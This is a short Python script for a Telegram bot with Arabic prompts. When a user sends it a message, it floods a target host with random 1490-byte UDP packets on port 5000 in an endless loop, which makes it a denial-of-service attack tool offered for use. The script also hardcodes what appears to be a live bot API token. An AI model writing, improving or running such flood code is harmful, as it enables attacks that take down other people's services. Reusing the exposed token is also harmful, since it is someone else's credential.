import socket

import re

import random

import telebot

bot = telebot.TeleBot("1940336517:AAF_VuY9zTzzGV11F9Z9sX3x3VAtBAkC4_g")

print("- [ ! ] Bot Running Now .")

@bot.message_handler(commands=['start'])
def s(message):

 bot.reply_to(message, "ارسل الدومين")

@bot.message_handler(func=lambda m: True)
def echo_all(message):

 sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

 bytes = random._urandom(1490)
  
 bot.reply_to(message, "بدء")
 
 while True : 

     sock.sendto(bytes, (socket.gethostbyname("اكتب الدومين هنا"), 5000))

bot.polling(True)